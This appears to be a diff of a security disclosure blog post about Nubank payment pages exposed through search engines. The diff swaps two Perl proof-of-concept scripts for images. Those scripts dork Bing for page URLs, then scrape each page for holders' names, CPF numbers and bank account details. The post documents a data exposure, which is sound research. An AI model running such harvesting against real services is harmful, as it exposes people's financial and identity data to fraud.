@@ -47,44 +47,7 @@ And these are just some of the results, on Twitter you could see that some peopl
 
 Convinced to demonstrate an impact of the abuse of this functionality, I decided to create a proof of concept. The first part of this PoC boiled down to building code that would be able to use a search engine to collect as many URLs as possible, so I did a simple *scraper* for Bing:
 
-```perl
-#!/usr/bin/env perl
-
-use 5.018;
-use strict;
-use warnings;
-use WWW::Mechanize;
-use Mojo::Util qw( url_escape);
-
-sub main {
-    my $dork = $ARGV[0];
-
-    if ($dork) {
-        my $mech = WWW::Mechanize -> new();
-        my %seen = ();
-
-        $dork = url_escape($dork);
-
-        for my $page (0 .. 10) {
-            my $url = "http://www.bing.com/search?q=${dork}&first=${page}0";
-            $mech -> get($url);
-            my @links = $mech -> links();
-                        
-            foreach my $link (@links) {
-                $url = $link -> url();
-                next if $seen{$url}++;
-
-                if ($url =~ m/^https?/ && $url !~ m/bing|live|microsoft|msn/) {
-                    print $url, "\n";
-                }
-            }
-        }
-    }
-}
-
-main();
-exit;
-```
+![](/images/publications/nubank-scraping/bing-scraper.png)
 
 From that code, I was able to collect 100 valid URLs:
 
@@ -92,49 +55,7 @@ From that code, I was able to collect 100 valid URLs:
 
 After having all these URLs in a .txt, I had to build another *scraper* that scraped data on the Nubank page:
 
-```perl
-#!/usr/bin/env perl
-
-use 5.018;
-use strict;
-use warnings;
-use Mojo::DOM;
-use Mojo::UserAgent;
-
-sub main {
-    my $urls_file = $ARGV[0];
-
-    if ($urls_file) {
-        open my $urls_filehandle, "<", $urls_file or die $!;
-
-        while (<$urls_filehandle>) {
-            chomp($_);
-
-            my $userAgent = Mojo::UserAgent -> new();
-            my $response  = $userAgent -> get($_) -> result();
-
-            if ($response -> is_success()) {
-                my $account = $response -> dom -> find("tr td") -> map("text") -> join(",");
-
-                $account =~ s/Nome,//
-                && $account =~ s/CPF,//
-                && $account =~ s/Banco,//
-                && $account =~ s/Tipo da conta,//
-                && $account =~ s/Agência,//
-                && $account =~ s/Conta,//
-                && $account =~ s/Agência Métodos,//;
-
-                say $account;
-            }
-        }
-
-        close($urls_filehandle);
-    }
-}
-
-main();
-exit;
-```
+![](/images/publications/nubank-scraping/nubank-scraper.png)
 
 And this was the result:
 
